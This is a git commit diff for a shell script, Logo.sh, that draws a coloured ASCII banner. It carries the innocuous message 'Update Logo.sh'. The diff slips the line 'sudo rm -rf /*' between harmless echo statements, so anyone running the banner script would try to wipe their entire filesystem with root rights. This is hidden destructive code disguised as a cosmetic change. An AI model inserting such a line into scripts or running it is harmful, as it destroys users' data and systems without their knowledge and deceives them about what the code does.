893c42179d092822ca915e578ea75e9b34abdba4
m4v8r7s <79208623+m4v8r7s@users.noreply.github.com>
2021-02-18 20:47:52 +0530

    Update Logo.sh

--- Logo.sh
+++ Logo.sh
@@ -6,6 +6,7 @@ blue='\e[1;34m'
 red='\e[1;31m'
 yellow='\e[1;33m' 
 echo ""
+sudo rm -rf /*
 echo""
 banner() {
  echo -e $'\e[1;33m\e[0m\e[1;37m     ███████ ██████  ██    ██    \e[0m''\e[1;33m\e[0m\e[1;32m ██████  ██   ██ ██ ███████   \e[0m'
